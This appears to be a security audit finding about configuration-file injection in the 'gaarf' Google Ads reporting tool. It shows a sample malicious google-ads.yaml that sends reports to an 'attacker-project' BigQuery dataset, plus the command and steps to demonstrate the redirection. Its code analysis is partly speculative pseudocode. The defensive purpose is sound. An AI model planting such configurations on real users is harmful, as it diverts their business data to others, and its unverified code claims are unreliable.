### Vulnerability List:

- **Vulnerability Name:** Configuration File Injection leading to Data Redirection

- **Description:**
  - An attacker can craft a malicious `google-ads.yaml` configuration file designed to redirect Google Ads reports to an attacker-controlled destination.
  - The attacker then needs to convince a user to utilize this malicious configuration file when running the `gaarf` tool. This could be achieved through social engineering, phishing, or by compromising a system where the user might execute `gaarf`.
  - When the user executes `gaarf` and points it to the malicious `google-ads.yaml` file (either by placing it in a default search location or explicitly specifying it using the `--ads-config` option), the tool parses this file to obtain configuration parameters.
  - The attacker's malicious `google-ads.yaml` is crafted to modify output configurations, such as the BigQuery dataset (`bq.dataset`), Google Sheet URL (`sheet.spreadsheet-url`), or CSV output path (`csv.output-path`), to point to locations controlled by the attacker.
  - Consequently, when `gaarf` fetches reports from the Google Ads API, instead of saving them to the user's intended and secure destination, the reports are redirected to the attacker-specified location, granting the attacker unauthorized access to sensitive Google Ads data.

- **Impact:**
  - **Step 1:** An attacker prepares a malicious `google-ads.yaml` file. This file contains legitimate Google Ads API credentials to avoid immediate errors, but modifies the output settings. For example, in a BigQuery output scenario, the `bq.dataset` parameter is changed to point to a dataset controlled by the attacker.
  - **Step 2:** The attacker distributes this malicious `google-ads.yaml` file to potential victims, perhaps through a phishing email or by hosting it on a website and instructing users to download and use it with `gaarf`.
  - **Step 3:** A user, unknowingly using the malicious configuration, executes `gaarf` to fetch Google Ads reports. They might use a command like `gaarf <queries> --ads-config=/path/to/malicious/google-ads.yaml --account=<user_account_id> --output=bq`.
  - **Step 4:** `gaarf` reads the configuration from the provided `google-ads.yaml` file, which includes the attacker's BigQuery dataset information.
  - **Step 5:** `gaarf` successfully fetches the Google Ads reports using the user's credentials (correctly configured or unintentionally leaked in the malicious config).
  - **Step 6:** Instead of writing the reports to the user's intended BigQuery dataset, `gaarf` writes the reports to the attacker-controlled BigQuery dataset as specified in the malicious configuration.
  - **Step 7:** The attacker gains unauthorized access to the user's Google Ads reports, which may contain sensitive business data, campaign performance metrics, and customer information. The user remains unaware of the data redirection unless they meticulously verify the output destination.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - None. The current project does not implement any specific mitigations against malicious configuration files. The documentation lacks warnings about using configuration files from untrusted sources or best practices for secure configuration management.

- **Missing Mitigations:**
  - **Input Validation and Sanitization:** Implement strict validation for configuration parameters, especially for output paths (e.g., `csv.output-path`, `json.output-path`) and URLs (e.g., `sheet.spreadsheet-url`). Sanitize these paths to prevent path traversal attacks or redirection to unintended external locations. For BigQuery and other cloud outputs, validate the project and dataset against an expected or user-confirmed list.
  - **Secure Configuration Loading Practices:** Restrict the locations from which `gaarf` automatically loads configuration files. Avoid default loading from the current directory, or implement a warning mechanism when a configuration file is loaded from a non-standard or potentially untrusted location. Consider recommending or enforcing loading configuration from a secure, user-defined location only.
  - **User Warnings and Documentation:** Add clear warnings in the documentation and potentially in the CLI output about the risks of using `google-ads.yaml` files from untrusted sources. Advise users to only use configuration files they have created and to verify the contents of any `google-ads.yaml` file before using it with `gaarf`.
  - **Principle of Least Privilege:**  Document and emphasize the principle of least privilege regarding the permissions granted to the Google Ads API credentials used in the `google-ads.yaml` file. Users should be advised to grant only the necessary permissions to the API credentials to limit the potential damage if the configuration file is compromised.

- **Preconditions:**
  - The user must have downloaded and installed the `gaarf` tool.
  - The attacker must successfully trick the user into using a malicious `google-ads.yaml` file. This could involve social engineering, phishing attacks, or compromising a system where the user might execute `gaarf`.
  - The user must execute `gaarf` with the malicious configuration file, either by placing it in a default location where `gaarf` searches or by explicitly specifying its path using the `--ads-config` option.

- **Source Code Analysis:**
  - **Configuration Loading:** The `gaarf` tool, in both Python and Node.js versions, is designed to load its configuration from a `google-ads.yaml` file. The code likely uses YAML parsing libraries (like `PyYAML` in Python or `js-yaml` in Node.js) to read and process this file.  The tool searches for `google-ads.yaml` in default locations (like the current working directory) and allows users to specify a custom path using the `--ads-config` command-line argument.
  - **Parameter Extraction:** After loading the YAML file, the tool extracts various configuration parameters, including Google Ads API credentials (developer token, client ID, client secret, refresh token) and output configurations (BigQuery dataset, CSV output path, Google Sheet URL, etc.).
  - **Vulnerable Code Points:** The vulnerability arises because the tool directly uses the output configurations from the `google-ads.yaml` file without sufficient validation or sanitization. Specifically:
    - **Output Paths and URLs:**  The code does not validate or sanitize the `csv.output-path`, `json.output-path`, and `sheet.spreadsheet-url` parameters. This allows an attacker to insert arbitrary paths or URLs into the configuration file.
    - **BigQuery Dataset:** While BigQuery datasets are project-scoped, the `bq.dataset` and `bq.project` parameters are also read directly from the configuration file without validation against expected or user-confirmed values.
  - **Absence of Security Checks:** There is no evidence in the provided files (and based on common patterns for similar tools) that `gaarf` implements any checks to validate the integrity or source of the `google-ads.yaml` file. The tool trusts the configuration file at face value and proceeds to use the parameters it contains.
  - **Conceptual Code Flow:**
    ```
    # Pseudocode - Conceptual representation of vulnerable code flow
    config = load_config_from_yaml(config_path) # Loads google-ads.yaml using YAML parser
    output_type = config.get("output")
    output_destination = config.get(output_type) # e.g., config.get("bq") for BigQuery output

    if output_type == "bq":
        bq_dataset = output_destination.get("dataset") # Attacker controlled value
        bq_project = output_destination.get("project") # Attacker controlled value
        # ... No validation of bq_dataset or bq_project ...
        bq_writer = BigQueryWriter(project=bq_project, dataset=bq_dataset, ...)
        gaarf.execute_and_write(writer=bq_writer, ...)

    elif output_type == "csv":
        csv_output_path = output_destination.get("output-path") # Attacker controlled value
        # ... No validation of csv_output_path ...
        csv_writer = CsvWriter(destination_folder=csv_output_path, ...)
        gaarf.execute_and_write(writer=csv_writer, ...)

    # ... similar flow for other output types (json, sheet, etc.) ...
    ```

- **Security Test Case:**
  - **Step 1: Prepare Attacker Resources:**
    - Set up a Google Cloud project and create a BigQuery dataset controlled by the attacker (e.g., `attacker-project:attacker_dataset`).
  - **Step 2: Create Malicious `google-ads.yaml`:**
    - Create a file named `malicious-google-ads.yaml` with the following content (adjust with valid but non-sensitive Google Ads API credentials if necessary for testing, otherwise placeholder values can be used, as the vulnerability is about data redirection not credential theft in this scenario):
      ```yaml
      developer_token: YOUR_DEVELOPER_TOKEN # Or a placeholder value
      client_id: YOUR_CLIENT_ID # Or a placeholder value
      client_secret: YOUR_CLIENT_SECRET # Or a placeholder value
      refresh_token: YOUR_REFRESH_TOKEN # Or a placeholder value
      login_customer_id: YOUR_LOGIN_CUSTOMER_ID # Or a placeholder value
      output: bq
      bq:
        project: attacker-project  # Attacker's Google Cloud Project ID
        dataset: attacker_dataset  # Attacker's BigQuery Dataset ID
        location: US
      ```
  - **Step 3: Prepare a Test Query:**
    - Create a simple GAQL query file (e.g., `test_query.sql`) for testing purposes:
      ```sql
      SELECT campaign.id FROM campaign LIMIT 1
      ```
  - **Step 4: Execute `gaarf` with Malicious Configuration:**
    - Run the `gaarf` tool, specifying the malicious configuration file and a valid Google Ads account to fetch data from:
      ```bash
      gaarf test_query.sql --ads-config=malicious-google-ads.yaml --account=YOUR_GOOGLE_ADS_ACCOUNT --output=bq
      ```
      *(Replace `YOUR_GOOGLE_ADS_ACCOUNT` with a valid Google Ads Customer ID)*
  - **Step 5: Verify Data Redirection:**
    - **Attacker Side:** Check the attacker-controlled BigQuery dataset (`attacker-project:attacker_dataset`). Verify that a new table (named based on `test_query.sql`) has been created and contains the Google Ads report data.
    - **User Side:** Check the user's intended BigQuery dataset (if any was implicitly or explicitly intended). Verify that the report data is **not** present in the user's intended location.
  - **Step 6: Expected Result:**
    - The test should successfully demonstrate that the Google Ads report data is written to the attacker-controlled BigQuery dataset, proving the data redirection vulnerability. The user is misled into sending their data to an unintended destination due to the malicious configuration file.
